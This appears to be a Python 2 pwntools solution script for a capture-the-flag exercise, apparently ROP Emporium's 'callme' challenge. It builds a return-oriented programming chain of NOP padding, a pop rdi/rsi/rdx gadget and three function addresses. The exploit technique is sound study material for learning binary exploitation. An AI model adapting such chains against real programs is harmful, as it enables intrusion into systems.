from pwn import *

pattern = "\x90" * 40
call_me_three ="\x6a\x1a\x40\x00\x00\x00\x00\x00"
call_me_two = "\x7e\x1a\x40\x00\x00\x00\x00\x00"
call_me_one = "\x92\x1a\x40\x00\x00\x00\x00\x00"
pop_rdi_rsi_rdx = "\xb0\x1a\x40\x00\x00\x00\x00\x00"

rdi = p64(0x1)
rsi = p64(0x2)
rdx = p64(0x3)


exploit = pattern
exploit += pop_rdi_rsi_rdx + rdi + rsi + rdx 
exploit += call_me_one
exploit += pop_rdi_rsi_rdx + rdi + rsi + rdx 
exploit += call_me_two
exploit += pop_rdi_rsi_rdx + rdi + rsi + rdx 
exploit += call_me_three

print exploit
